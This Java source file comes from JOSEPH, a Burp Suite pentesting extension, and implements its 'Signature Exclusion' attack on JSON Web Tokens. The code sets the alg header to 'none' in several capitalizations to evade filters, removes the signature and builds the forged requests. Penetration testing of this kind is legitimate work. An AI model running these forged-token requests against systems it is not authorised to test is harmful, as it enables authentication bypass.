/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.SignatureExclusion;

import burp.*;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.attacks.SignatureExclusion.SignatureExclusion;
import eu.dety.burp.joseph.utilities.Decoder;

import javax.swing.*;
import java.util.*;

/**
 * Signature Exclusion Attack Info
 * <p>
 * Class holding meta data for the Signature Exclusion attack
 * and for preparing all necessary parameter for the actual attack.
 *
 * @author Dennis Detering
 * @version 1.0
 */
public class SignatureExclusionInfo implements IAttackInfo {
    private Decoder joseDecoder;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "signature_exclusion";

    // Full name of the attack
    private static final String name = "Signature Exclusion";

    // Attack description
    private static final String description = "<html>The <em>Signature Exclusion</em> attack tries to get the token mistakenly verified " +
            "by using the <em>None</em> algorithm and removing the signature.<br/>" +
            "In order to perform filter evasion, different capitalization is used as algorithm value.</html>";

    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");

    // Hashmap of "none" algorithm type variations
    private static final HashMap<payloadType, String> noneAlgVariations = new HashMap<payloadType, String>() {{
        put(payloadType.LOWERCASE, "none");
        put(payloadType.CAPITALIZED, "None");
        put(payloadType.UPPERCASE, "NONE");
        put(payloadType.MIXED, "nOnE");
    }};

    // Amount of requests needed
    private static final int amountRequests = noneAlgVariations.size();

    // Types of payload variation
    private enum payloadType {
        LOWERCASE,
        CAPITALIZED,
        UPPERCASE,
        MIXED
    }

    // List of SignatureExclusionsAttackRequest obejcts holding prepared attack requests
    private List<SignatureExclusionAttackRequest> requests = new ArrayList<>();

    @Override
    public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.joseDecoder = new Decoder();
        this.helpers = callbacks.getHelpers();
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        for (Map.Entry<payloadType, String> noneAlgVariation : noneAlgVariations.entrySet()) {
            try {
                // Change the "alg" header value for each of the noneAlgVariation entries
                // and rebuild a valid request
                byte[] tmpRequest = this.requestResponse.getRequest();
                String[] tmpComponents = joseDecoder.getComponents(this.parameter.getValue());
                String tmpDecodedHeader = joseDecoder.getDecoded(tmpComponents[0]);
                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation.getValue() + "\"");
                String tmpReplacedEncoded = joseDecoder.getEncoded(tmpReplaced);
                String[] tmpNewComponents = {tmpReplacedEncoded, tmpComponents[1], ""};
                String tmpParameterValue = joseDecoder.concatComponents(tmpNewComponents);

                IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getType());
                tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);

                requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal() , noneAlgVariation.getValue()));
            } catch (Exception e) {
                throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
            }
        }

        return new SignatureExclusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel) {
        return false;
    }

    @Override
    public boolean isSuitable(String type, String algorithm) {
        if(type != null && !type.equals("")) {
            return this.getSuitableTypes().contains(type.toLowerCase());
        }

        // TODO: Guessing / further checks if type is null
        return false;
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<SignatureExclusionAttackRequest> getRequests() {
        return this.requests;
    }
}
